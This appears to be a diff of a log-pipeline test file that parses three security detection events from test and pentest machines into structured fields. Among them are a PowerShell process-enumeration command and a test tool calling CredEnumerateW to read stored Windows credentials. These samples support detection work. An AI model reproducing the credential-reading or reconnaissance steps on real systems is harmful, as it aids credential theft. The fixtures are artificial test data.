   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaePowershellTraceEvent, Event Name: OpticsCaePowershellTraceEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 4b199c5c-60dc-4b5c-8dac-86965ba5b051, Severity: Medium, Description: SYSLOG detections - Looking for PowershellTrace get-childitem, Instigating Process Name: powershell.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C, Event Timestamp: 2022-06-28T18:10:39.547Z, Event Received Timestamp: 2022-06-28T18:10:43Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 9eb1073c-913f-49ab-9b12-2e5a28dad18d, Instigating Process Command Line: powershell gwmi -class win32_process, Instigating Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe, Script Block Text: @{GUID=\"EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"Author=\"Microsoft Corporation\"CompanyName=\"Micros, Script Block Length: 2583, Payload: None, Payload Length: 0, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "SYSLOG detections - Looking for PowershellTrace get-childitem"
+      detection_rule_id: "9eb1073c-913f-49ab-9b12-2e5a28dad18d"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "4b199c5c-60dc-4b5c-8dac-86965ba5b051"
+      event_received_timestamp: "2022-06-28T18:10:43Z"
+      event_timestamp: "2022-06-28T18:10:39.547Z"
+      event_type: "OpticsCaePowershellTraceEvent"
+      evt:
+        name: "OpticsCaePowershellTraceEvent"
+      instigating_process_command_line: "powershell gwmi -class win32_process"
+      instigating_process_file_path: "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+      instigating_process_imagefilesha256: "DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C"
+      instigating_process_name: "powershell.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      payload: "None"
+      payload_length: 0
+      script_block_length: 2583
+      script_block_text: "@{GUID=\"EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"Author=\"Microsoft Corporation\"CompanyName=\"Micros"
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaePowershellTraceEvent, Event Name: OpticsCaePowershellTraceEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 4b199c5c-60dc-4b5c-8dac-86965ba5b051, Severity: Medium, Description: SYSLOG detections - Looking for PowershellTrace get-childitem, Instigating Process Name: powershell.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C, Event Timestamp: 2022-06-28T18:10:39.547Z, Event Received Timestamp: 2022-06-28T18:10:43Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 9eb1073c-913f-49ab-9b12-2e5a28dad18d, Instigating Process Command Line: powershell gwmi -class win32_process, Instigating Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe, Script Block Text: @{GUID=\"EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"Author=\"Microsoft Corporation\"CompanyName=\"Micros, Script Block Length: 2583, Payload: None, Payload Length: 0, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeWmiEvent, Event Name: OpticsCaeWmiEvent, Device Name: JEFWILLIAMS-1, Zone Names: (JeffTesting,Jeff_3.0), Event Id: 9fa208e5-779d-40b1-b4e2-44c330600396, Severity: Medium, Description: SYSLOG detections - Looking for WmiTrace select, Instigating Process Name: WmiPrvSE.exe, Instigating Process Owner: NT AUTHORITY//NETWORK SERVICE, Instigating Process ImageFileSha256: B5C78BEF3883E3099F7EF844DA1446DB29107E5C0223B97F29E7FAFAB5527F15, Event Timestamp: 2022-06-28T18:09:55.613Z, Event Received Timestamp: 2022-06-28T18:09:57Z, Device Last Reported Users: (RIMNET\\jefwilliams), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,24362CB3F25D4EB59C03FD6E3800C20E), Detection Rule Id: f83b1ac8-b966-4297-be47-bb893bf23f2d, Instigating Process Command Line: C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe-secured-Embedding, Instigating Process File Path: c:\\windows\\system32\\wbem\\wmiprvse.exe, Consumer Text: None, Consumer Text Length: 0, Operation: Start IWbemServices::CreateInstanceEnum - root\\Standardcimv2 : MSFT_NetIPAddress, Operation Length: 80, Device Id: c6246140-bba5-4c55-be02-77300bf91dbc"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      consumer_text: "None"
+      consumer_text_length: 0
+      description: "SYSLOG detections - Looking for WmiTrace select"
+      detection_rule_id: "f83b1ac8-b966-4297-be47-bb893bf23f2d"
+      device_id: "c6246140-bba5-4c55-be02-77300bf91dbc"
+      device_last_reported_users:
+       - "RIMNET\\jefwilliams"
+      device_name: "JEFWILLIAMS-1"
+      event_id: "9fa208e5-779d-40b1-b4e2-44c330600396"
+      event_received_timestamp: "2022-06-28T18:09:57Z"
+      event_timestamp: "2022-06-28T18:09:55.613Z"
+      event_type: "OpticsCaeWmiEvent"
+      evt:
+        name: "OpticsCaeWmiEvent"
+      instigating_process_command_line: "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe-secured-Embedding"
+      instigating_process_file_path: "c:\\windows\\system32\\wbem\\wmiprvse.exe"
+      instigating_process_imagefilesha256: "B5C78BEF3883E3099F7EF844DA1446DB29107E5C0223B97F29E7FAFAB5527F15"
+      instigating_process_name: "WmiPrvSE.exe"
+      instigating_process_owner: "NT AUTHORITY//NETWORK SERVICE"
+      operation: "Start IWbemServices::CreateInstanceEnum - root\\Standardcimv2 : MSFT_NetIPAddress"
+      operation_length: 80
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,24362CB3F25D4EB59C03FD6E3800C20E)"
+      zone_names: "(JeffTesting,Jeff_3.0)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeWmiEvent, Event Name: OpticsCaeWmiEvent, Device Name: JEFWILLIAMS-1, Zone Names: (JeffTesting,Jeff_3.0), Event Id: 9fa208e5-779d-40b1-b4e2-44c330600396, Severity: Medium, Description: SYSLOG detections - Looking for WmiTrace select, Instigating Process Name: WmiPrvSE.exe, Instigating Process Owner: NT AUTHORITY//NETWORK SERVICE, Instigating Process ImageFileSha256: B5C78BEF3883E3099F7EF844DA1446DB29107E5C0223B97F29E7FAFAB5527F15, Event Timestamp: 2022-06-28T18:09:55.613Z, Event Received Timestamp: 2022-06-28T18:09:57Z, Device Last Reported Users: (RIMNET\\jefwilliams), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,24362CB3F25D4EB59C03FD6E3800C20E), Detection Rule Id: f83b1ac8-b966-4297-be47-bb893bf23f2d, Instigating Process Command Line: C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe-secured-Embedding, Instigating Process File Path: c:\\windows\\system32\\wbem\\wmiprvse.exe, Consumer Text: None, Consumer Text Length: 0, Operation: Start IWbemServices::CreateInstanceEnum - root\\Standardcimv2 : MSFT_NetIPAddress, Operation Length: 80, Device Id: c6246140-bba5-4c55-be02-77300bf91dbc"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Name: OpticsCaeApiEvent, Device Name: SECURITYSERVER3, Zone Names: (ZoneOne,ZoneTwo), Event Id: d29ee101-a2a2-42f1-b9ab-7e4b18aeeef1, Severity: High, Description: Test - API Sensor, High priority event, Instigating Process Name: IReadCredentials.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: E24F5A2B51EC1C260388348AF764B8794CE0566749F5801D024B7B422C63DC56, Event Timestamp: 2022-09-28T14:23:37.384Z, Event Received Timestamp: 2022-09-28T14:24:30Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: be7403ca-a9f4-4aa7-ad6d-7c672bfa8fc9, Instigating Process Command Line: IReadCredentials.exe, Instigating Process File Path: c:\\apisensor\\ireadcredentials.exe, API DLL: Advapi32.dll, API Function: CredEnumerateW, API Parameters: Unknown"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      api_dll: "Advapi32.dll"
+      api_function: "CredEnumerateW"
+      api_parameters: "Unknown"
+      description: "Test - API Sensor, High priority event"
+      detection_rule_id: "be7403ca-a9f4-4aa7-ad6d-7c672bfa8fc9"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "d29ee101-a2a2-42f1-b9ab-7e4b18aeeef1"
+      event_received_timestamp: "2022-09-28T14:24:30Z"
+      event_timestamp: "2022-09-28T14:23:37.384Z"
+      evt:
+        name: "OpticsCaeApiEvent"
+      instigating_process_command_line: "IReadCredentials.exe"
+      instigating_process_file_path: "c:\\apisensor\\ireadcredentials.exe"
+      instigating_process_imagefilesha256: "E24F5A2B51EC1C260388348AF764B8794CE0566749F5801D024B7B422C63DC56"
+      instigating_process_name: "IReadCredentials.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "High"
+      status: "critical"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(ZoneOne,ZoneTwo)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Name: OpticsCaeApiEvent, Device Name: SECURITYSERVER3, Zone Names: (ZoneOne,ZoneTwo), Event Id: d29ee101-a2a2-42f1-b9ab-7e4b18aeeef1, Severity: High, Description: Test - API Sensor, High priority event, Instigating Process Name: IReadCredentials.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: E24F5A2B51EC1C260388348AF764B8794CE0566749F5801D024B7B422C63DC56, Event Timestamp: 2022-09-28T14:23:37.384Z, Event Received Timestamp: 2022-09-28T14:24:30Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: be7403ca-a9f4-4aa7-ad6d-7c672bfa8fc9, Instigating Process Command Line: IReadCredentials.exe, Instigating Process File Path: c:\\apisensor\\ireadcredentials.exe, API DLL: Advapi32.dll, API Function: CredEnumerateW, API Parameters: Unknown"
+    service: "detection-events"
+    status: "critical"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
